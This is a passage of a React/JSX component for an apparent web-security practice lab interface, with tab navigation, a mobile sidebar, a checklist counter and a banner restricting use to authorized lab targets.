              <span>lab · {checklistDone}/{checklistItems.length}</span>
            </div>
            <button
              type="button"
              onClick={() => setSidebarOpen(o => !o)}
              className="lg:hidden w-8 h-8 rounded-xl bg-white/5 border border-white/10 flex items-center justify-center text-white/40 hover:text-white/70"
              aria-label="Menu"
            >
              <Menu size={14} />
            </button>
          </div>
        </div>

        <div className="rounded-2xl border border-violet-500/30 p-4 flex gap-3 mb-4" style={{ background: 'rgba(139,92,246,0.08)' }}>
          <AlertTriangle className="text-violet-400 mt-0.5 flex-shrink-0" size={18} />
          <div className="text-sm text-violet-100/80">
            Authorized labs only (DVWA, Juice Shop, HTB/THM, your VMs). Do not run these probes against systems you do not own or have written permission to test.
          </div>
        </div>

        {sidebarOpen && (
          <div className="lg:hidden mb-4 rounded-xl border border-white/10 bg-black/40 p-2 space-y-1">
            {tabs.map(tab => {
              const Icon = tab.icon
              return (
                <button
                  key={tab.id}
                  type="button"
                  onClick={() => setTab(tab.id)}
                  className={`w-full flex items-center gap-2 px-3 py-2.5 rounded-lg text-sm ${
                    activeTab === tab.id ? 'bg-violet-500 text-white' : 'text-white/50 hover:bg-white/5'
                  }`}
                >
                  <Icon size={14} /> {tab.label}
                </button>
              )
            })}
          </div>
        )}

        <div className="hidden lg:flex bg-white/5 rounded-xl p-1 border border-white/10 mb-6 overflow-x-auto">
          {tabs.map(tab => {
            const Icon = tab.icon
            return (
              <button
                key={tab.id}
                type="button"
                onClick={() => setTab(tab.id)}
                className={`flex items-center gap-2 px-3 py-2 rounded-lg text-sm font-medium transition-all whitespace-nowrap ${
                  activeTab === tab.id ? 'bg-violet-500 text-white' : 'text-white/40 hover:text-white/70'
                }`}
              >
                <Icon size={14} /> {tab.label}
              </button>
            )
          })}
        </div>

        <div className="rounded-2xl border border-white/10 p-6" style={{ background: 'rgba(255,255,255,0.03)' }}>
          {panel}
        </div>
      </div>
    </div>
  )
}
